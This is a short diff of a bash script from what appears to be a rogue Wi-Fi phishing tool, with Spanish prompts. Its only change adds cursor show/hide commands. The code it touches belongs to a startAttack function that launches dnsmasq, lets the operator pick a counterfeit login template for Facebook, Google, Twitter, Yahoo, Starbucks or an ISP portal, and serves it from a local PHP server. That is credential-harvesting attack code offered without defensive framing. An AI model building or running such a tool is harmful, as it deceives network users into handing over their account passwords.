@@ -141,8 +141,8 @@ function startAttack(){
 	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
 	sleep 5
 
-	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, optimumwifi):${endColour} " && read template
-	cp -r $template/* .
+	tput cnorm; echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, optimumwifi):${endColour} " && read template
+	tput civis; cp -r $template/* .
 	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
 	php -S 192.168.1.1:80 > /dev/null 2>&1 &
 	sleep 2
